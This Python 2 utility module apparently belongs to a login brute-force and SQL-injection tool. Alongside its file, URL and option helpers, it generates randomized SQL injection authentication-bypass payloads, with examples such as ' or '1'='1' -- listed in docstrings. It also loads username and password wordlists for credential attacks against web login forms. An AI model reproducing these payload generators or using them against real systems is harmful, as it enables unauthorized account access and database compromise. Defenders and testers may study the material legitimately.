import random, sys, string
from utils import die

# def getRootDir(pathModuleLocation):
# 	##################################
# 	#	Get root folder of module file
# 	#	/foo/bar/module.py
# 	#	---> return "/foo/bar"
# 	#################################
# 
# 	pathModuleLocation = "/".join(pathModuleLocation.split("/")[:-1])
# 	return pathModuleLocation

# def size_o(objInputData):
# 	#	Return length of a file object or list
# 	if type(objInputData) == file:

# 		retFileSize = len(objInputData.readlines())
# 		objInputData.seek(0)
# 		return retFileSize

# 	elif type(objInputData) == list:
# 		return len(objInputData)
# 	elif type(objInputData) == str:
# 		return len(objInputData.split('\n'))

def truecon():
	# Generate true condition of SQL query
	"""
	Equal:
		' or '1'='1' -- --
	Static:
		1' or not false #
		1' or true #
	Compare:
		1' or 12 rlike 12 #
		2' or '2'>'0' -- --
		2' or 2>0 -- --
	"""
	# Payload template: ['or' | '||'] [condition] 
	def cCon():
		return randomFromList(["or", "||"])
	def sCon():
		conType = randomFromList(["equal", "static"])#, "compare"])
		# Could be faster than create a dict and call element from dict
		if conType == "static":
			return randomFromList(["not false", "true"])
		# elif conType == "compare":
		# 	pass
		elif conType == "equal":
			genType = randomFromList(["char", "dig"])
			_stri = srand(min = 3, max = 5, stype = genType)
			if genType == "char":
				return "'%s'='%s'" %(_stri, _stri)
			elif genType == "dig":
				return "%s=%s" %(_stri, _stri)

	return "%s %s" %(cCon(), sCon())

def sPayload():
	def sEnd():
		return randomFromList(["-- --", "#"])
	# Generate random SQL injection payload
	# Payload template: [X / X' / X')] [True condition] [-- / #]

	fchar = ["", "'", ")", "')", "'))", "))"]

	for pchar in fchar:
		yield "%s %s %s" %(pchar, truecon(), sEnd())

def randomFromList(listData):
	return random.choice(listData)

def randomFromFile(path):
	##########################################
	#	Return random User Agents from file
	#
	##########################################

	loadData = fread(path).split("\n")
	retData = randomFromList(loadData)
	return retData


def lread(strUsername):
	#################################
	#	split input username to a list
	#	username -> [username]
	#	user1:user2 -> [user1, user2]
	#
	##################################

	return strUsername.split(":")

def fload(pathFileLocation):
	###################################
	#	Read and return data file
	#	Return file object instead of list
	#
	###################################
	try:
		objFileRead = open(pathFileLocation, 'r')
		return objFileRead
	except Exception as error:
		die("[x] Error while loading file!", error)
		
def fread(pathFileLocation):
	try:
		retObj = fload(pathFileLocation)
		return retObj.read()
	except Exception as error:
		die("[x] Error while reading data", error)
	finally:
		try:
			retObj.close()
		except:
			pass

def fwrite(pathFileLocation, writeData):
	try:
		objFileWrite = open(pathFileLocation, "w")
		objFileWrite.write(writeData)
	except Exception as error:
		die("[x] Error while writing data", error)
	finally:
		try:
			objFileWrite.close()
		except:
			pass

def fwrite_c(pathFileLocation, writeData):
	try:
		fileWrite = open(pathFileLocation, "a")
		fileWrite.write(writeData)
	except Exception as error:
		die("[x] Error while continuing write file", error)
	finally:
		fileWrite.close()

def srand(min = 2, max = 5, stype = "char"):
	# https://stackoverflow.com/a/2257449
	if stype == "char":
		charset = string.letters
	elif stype == "dig":
		charset = string.digits

	min, max = 0, random.randint(min, max)
	return ''.join(random.choice(charset) for _ in xrange(min, max))


def verify_url(url):
	try:
		# Shorter startswith https://stackoverflow.com/a/20461857
		if not url.startswith(("http://", "https://")):
			url = "http://%s" %(url)
	except:
		url = None
	return url

def create_tasks(options):
	# Read URL from list (file_path) or get URL from option
	try:
		options.target = fread(options.options["-l"]).split("\n") if options.options["-l"] else [options.url]
		options.target = filter(None, options.target)
	except Exception as error:
		die("[x] Options: URL error", error)
		# CHECK threads option
	try:
		options.threads = int(options.options["-t"])
		if options.threads < 1:
			die(
				"[x] Options: Invalid option \"threads\"",
				"Thread number must be larger than 1"
			)
	except Exception as error:
		die(
			"[x] Options: Invalid option \"threads\"",
			error
		)

	# CHECK timeout option
	try:
		options.timeout = int(options.options["-T"])
		if options.timeout < 1:
			die(
				"[x] Options: Invalid option \"timeout\"",
				"Thread number must be larger than 1"
			)
	except Exception as error:
		die(
			"[x] Options: Invalid option \"timeout\"",
			error
		)

def check_options(options, loginInfo):
	
	_, formField = loginInfo
	import data

	# CHECK username list options
	if len(formField) == 1:
		options.username = [""]
	elif options.options["-U"]:
		options.username = list(set(lread(options.options["-U"])))
	else:
		if options.options["-u"] in options.WORDLISTS:
			if options.options["-u"] == "sqli":
				options.username = eval("list(data.%s_user())" %(options.options["-u"]))
			else:
				options.username = eval("data.%s_user()" %(options.options["-u"])).replace("\t", "").split("\n")
		else:
			options.username = fread(options.options["-u"]).split("\n")
			options.username = filter(None, options.username)
	
	# CHECK passlist option
	if options.options["-p"] in options.WORDLISTS:
		options.passwd = eval("data.%s_pass()" %(options.options["-p"])).replace("\t", "").split("\n")
	else:
		options.passwd = fread(options.options["-p"]).split("\n")
		options.passwd = filter(None, options.passwd)


	options.report = options.run_options["--report"]
	options.verbose = options.run_options["--verbose"]


if __name__ == "__main__":
	die("Oops! Wrong place", "Find other place")
	